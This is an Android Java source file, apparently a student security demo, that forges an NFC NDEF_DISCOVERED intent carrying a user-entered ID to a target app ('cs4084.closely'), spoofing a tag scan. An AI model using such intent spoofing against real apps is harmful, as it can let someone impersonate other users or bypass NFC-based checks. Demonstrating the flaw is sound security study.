package com.example.nfcintentspoof;

import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.nfc.NdefMessage;
import android.nfc.NdefRecord;
import android.nfc.NfcAdapter;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import static android.nfc.NdefRecord.createMime;

public class MainActivity extends AppCompatActivity {

    Button spoofNfcButton;
    EditText userIdText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        spoofNfcButton = findViewById(R.id.spoofNfcButton);
        userIdText = findViewById(R.id.userIdText);

        spoofNfcButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String text = userIdText.getText().toString();

                NdefMessage message = new NdefMessage(
                        new NdefRecord[] { createMime(
                                "application/vnd.cs4084.closely",
                                text.getBytes()),
                                NdefRecord.createApplicationRecord("cs4084.closely") });
                /*NdefRecord record = createMime(
                        "application/vnd.cs4084.closely",
                        text.getBytes());*/

                Intent intent = new Intent("android.nfc.action.NDEF_DISCOVERED");
                intent.setType("application/vnd.cs4084.closely");
                intent.putExtra(NfcAdapter.EXTRA_NDEF_MESSAGES, new NdefMessage[] {message});

                startActivity(intent);
                finish();
            }
        });
    }
}
